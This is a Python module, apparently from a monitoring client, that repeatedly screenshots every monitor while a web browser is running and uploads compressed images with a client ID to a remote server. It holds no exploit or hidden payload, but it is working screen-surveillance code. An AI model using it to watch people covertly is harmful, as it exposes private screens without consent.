# Screen capture module using mss library

import mss
import time
import threading
import base64
import io
from PIL import Image
from datetime import datetime
import logging
import sys
import os
import psutil

# Add src to path for imports
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
from core.config import Config

class ScreenCapture:
    def __init__(self, api_client=None):
        self.api_client = api_client
        self.is_running = False
        self.capture_interval = 120  # 2 minutes
        self.browser_check_interval = 30  # Check for browsers every 30 seconds
        self.is_capturing = False
        self.last_disk_check = 0  # FIX ISSUE #68: Track last disk space check
        self.browser_tracker = None
        self.only_capture_with_browser = True  # Only capture when browser is active
        
        # Thread safety locks
        self._state_lock = threading.RLock()  # Reentrant lock for state variables
        self._capture_lock = threading.Lock()  # Lock for capture operations
        
        # Common browser process names across platforms
        self.browser_processes = {
            'chrome': ['chrome', 'chrome.exe', 'Google Chrome'],
            'firefox': ['firefox', 'firefox.exe', 'Firefox'],
            'safari': ['safari', 'Safari'],
            'edge': ['msedge', 'msedge.exe', 'Microsoft Edge'],
            'brave': ['brave', 'brave.exe', 'Brave Browser'],
            'opera': ['opera', 'opera.exe', 'Opera'],
            'vivaldi': ['vivaldi', 'vivaldi.exe', 'Vivaldi']
        }
        
        # Non-browser applications that we want to ignore for screen capture
        self.office_apps = {
            'microsoft_office': ['winword', 'excel', 'powerpnt', 'outlook', 'WINWORD.EXE', 'EXCEL.EXE', 'POWERPNT.EXE', 'OUTLOOK.EXE', 'Microsoft Word', 'Microsoft Excel', 'Microsoft PowerPoint', 'Microsoft Outlook'],
            'libreoffice': ['soffice', 'libreoffice', 'soffice.bin', 'LibreOffice'],
            'accounting': ['quickbooks', 'QuickBooks', 'sage', 'Sage', 'xero', 'Xero', 'peachtree', 'freshbooks', 'FreshBooks'],
            'adobe': ['photoshop', 'illustrator', 'acrobat', 'indesign', 'premiere', 'after effects', 'Adobe Photoshop', 'Adobe Illustrator', 'Adobe Acrobat', 'Adobe InDesign'],
            'text_editors': ['notepad++', 'Notepad++', 'TextEdit', 'gedit', 'nano']
        }
        
    def _set_running(self, value: bool):
        """Thread-safe setter for is_running"""
        with self._state_lock:
            self.is_running = value
            
    def _get_running(self) -> bool:
        """Thread-safe getter for is_running"""
        with self._state_lock:
            return self.is_running
            
    def _set_capturing(self, value: bool):
        """Thread-safe setter for is_capturing"""
        with self._state_lock:
            self.is_capturing = value
            
    def _get_capturing(self) -> bool:
        """Thread-safe getter for is_capturing"""
        with self._state_lock:
            return self.is_capturing
        
    def has_active_browsers(self):
        """Check if any browser processes are currently running"""
        try:
            # Use browser tracker if available for more accurate detection
            if self.browser_tracker and hasattr(self.browser_tracker, 'active_sessions'):
                # Check if there are any active browser sessions
                active_sessions = getattr(self.browser_tracker, 'active_sessions', {})
                if active_sessions:
                    logging.debug(f"Found {len(active_sessions)} active browser sessions via browser tracker")
                    return True
            
            # Fallback to process-based detection
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'] or ''
                    
                    # Check if process name matches any browser
                    for browser_name, process_names in self.browser_processes.items():
                        if any(pname.lower() in proc_name.lower() for pname in process_names):
                            logging.debug(f"Found active browser process: {proc_name}")
                            return True
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        except Exception as e:
            logging.error(f"Error checking for browsers: {e}")
            
        return False
        
    def get_active_browser_count(self):
        """Get count of active browser processes for logging"""
        count = 0
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'] or ''
                    
                    # Check if process name matches any browser
                    for browser_name, process_names in self.browser_processes.items():
                        if any(pname.lower() in proc_name.lower() for pname in process_names):
                            count += 1
                            break
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        except Exception as e:
            logging.error(f"Error counting browsers: {e}")
            
        return count
        
    def get_non_browser_apps(self):
        """Get list of running non-browser applications for logging"""
        non_browser_apps = []
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'] or ''
                    
                    # Skip system processes and helper processes
                    if any(skip in proc_name.lower() for skip in [
                        'agent', 'service', 'helper', 'daemon', 'xpc', 'extension', 
                        'settings', 'authentication', 'usage', 'managed', 'thumbnail',
                        'icon', 'decoder', 'encoder', 'plugin'
                    ]):
                        continue
                    
                    # Check if process name matches any non-browser app
                    for app_category, process_names in self.office_apps.items():
                        if any(proc_name.lower() == pname.lower() or 
                               (len(pname) > 5 and pname.lower() in proc_name.lower()) 
                               for pname in process_names):
                            non_browser_apps.append(f"{proc_name} ({app_category})")
                            break
                            
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                    
        except Exception as e:
            logging.error(f"Error getting non-browser apps: {e}")
            
        return non_browser_apps
        
    def should_capture_screen(self):
        """Determine if screen capture should be active based on running applications"""
        # Check if browser-only capture mode is enabled
        if self.only_capture_with_browser:
            browsers_active = self.has_active_browsers()
            if not browsers_active:
                logging.debug("Screenshot skipped: No active browsers detected (browser-only mode)")
                return False
            return True
            
        # Legacy behavior: capture if browsers active
        browsers_active = self.has_active_browsers()
        
        if browsers_active:
            return True
            
        # If no browsers but office/accounting apps are running, don't capture
        non_browser_apps = self.get_non_browser_apps()
        if non_browser_apps:
            logging.debug(f"Non-browser apps running: {non_browser_apps}")
            return False
            
        # Default: don't capture
        return False
        
    def set_browser_tracker(self, browser_tracker):
        """Set browser tracker instance for more detailed detection"""
        self.browser_tracker = browser_tracker
        
    def start_capture(self):
        """Start conditional screenshot capture loop - only when browsers are active"""
        self._set_running(True)
        logging.info("Conditional screenshot capture started")
        
        while self._get_running():
            try:
                # Check if screen capture should be active
                should_capture = self.should_capture_screen()
                browser_count = self.get_active_browser_count()
                non_browser_apps = self.get_non_browser_apps()
                
                if should_capture:
                    if not self._get_capturing():
                        self._set_capturing(True)
                        logging.info(f"Browsers detected ({browser_count} processes) - Starting screen capture")
                        if non_browser_apps:
                            logging.info(f"Also running: {', '.join(non_browser_apps[:3])}{'...' if len(non_browser_apps) > 3 else ''}")
                    
                    # Use capture lock to prevent concurrent captures
                    with self._capture_lock:
                        self.capture_screenshot()
                    time.sleep(self.capture_interval)
                else:
                    if self._get_capturing():
                        self._set_capturing(False)
                        if non_browser_apps:
                            logging.info(f"Only non-browser apps active ({', '.join(non_browser_apps[:2])}{'...' if len(non_browser_apps) > 2 else ''}) - Pausing screen capture (saving resources)")
                        else:
                            logging.info("No relevant applications active - Pausing screen capture (saving resources)")
                    
                    # Sleep shorter interval when not capturing to check for browsers more frequently
                    time.sleep(self.browser_check_interval)
                    
            except Exception as e:
                logging.error(f"Screenshot capture error: {str(e)}")
                time.sleep(5)  # Wait before retry
                
    def capture_screenshot(self):
        """Capture and send screenshot - only called when browsers are active"""
        try:
            # Double-check browsers are still active before capturing
            if not self.should_capture_screen():
                logging.debug("Capture conditions no longer met during capture - skipping")
                return False
                
            with mss.mss() as sct:
                # Capture all monitors
                monitors = sct.monitors[1:]  # Skip the first monitor (all monitors combined)
                
                for i, monitor in enumerate(monitors):
                    # Capture screenshot
                    screenshot = sct.grab(monitor)
                    
                    # Convert to PIL Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    
                    # Compress and convert to base64
                    screenshot_data = self.compress_image(img)
                    
                    # Prepare metadata for production API
                    metadata = {
                        'client_id': Config.CLIENT_ID,
                        'resolution': f"{screenshot.width}x{screenshot.height}",
                        'timestamp': datetime.now().isoformat(),
                        'browser_active': True  # Mark that this was captured during browser activity
                    }
                    
                    # Send to server using production API
                    if self.api_client:
                        try:
                            response = self.api_client.upload_screenshot(screenshot_data, metadata)
                            if response and response.get('success'):
                                logging.info(f"Screenshot {i+1} uploaded successfully")
                            else:
                                logging.error(f"Failed to upload screenshot {i+1}")
                        except Exception as upload_error:
                            logging.error(f"Error uploading screenshot {i+1}: {str(upload_error)}")
                    
            logging.info("Screenshot capture cycle completed")
            return True
            
        except Exception as e:
            logging.error(f"Error capturing screenshot: {str(e)}")
            return False
            
    def compress_image(self, img, quality=65, max_size=(1920, 1080)):
        """Compress image to reduce file size - quality 65 provides 50% smaller files while maintaining good quality"""
        # Resize if too large
        if img.size[0] > max_size[0] or img.size[1] > max_size[1]:
            img.thumbnail(max_size, Image.Resampling.LANCZOS)
        
        # Convert to JPEG and compress with optimized quality
        buffer = io.BytesIO()
        img.save(buffer, format='JPEG', quality=quality, optimize=True)
        
        # Convert to base64
        image_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
        return image_data
        
    def stop_capture(self):
        """Stop screenshot capture"""
        self._set_running(False)
        self._set_capturing(False)
        logging.info("Screenshot capture stopped")
        
    def capture_and_upload(self):
        """Single screenshot capture and upload for testing"""
        try:
            with mss.mss() as sct:
                # Capture primary monitor
                monitor = sct.monitors[1]  # Primary monitor
                screenshot = sct.grab(monitor)
                
                # Convert to PIL Image
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                # Compress and convert to base64
                screenshot_data = self.compress_image(img)
                
                # Prepare metadata
                metadata = {
                    'client_id': Config.CLIENT_ID,
                    'resolution': f"{screenshot.width}x{screenshot.height}",
                    'timestamp': datetime.now().isoformat(),
                    'monitor': 1
                }
                
                # Upload to server
                if self.api_client:
                    try:
                        response = self.api_client.upload_screenshot(screenshot_data, metadata)
                        if response and isinstance(response, dict):
                            return response
                        else:
                            return {'success': False, 'message': 'Invalid response from server'}
                    except Exception as upload_error:
                        return {'success': False, 'message': f'Upload error: {str(upload_error)}'}
                else:
                    return {'success': False, 'message': 'No API client available'}
                    
        except Exception as e:
            return {'success': False, 'message': f'Capture error: {str(e)}'}
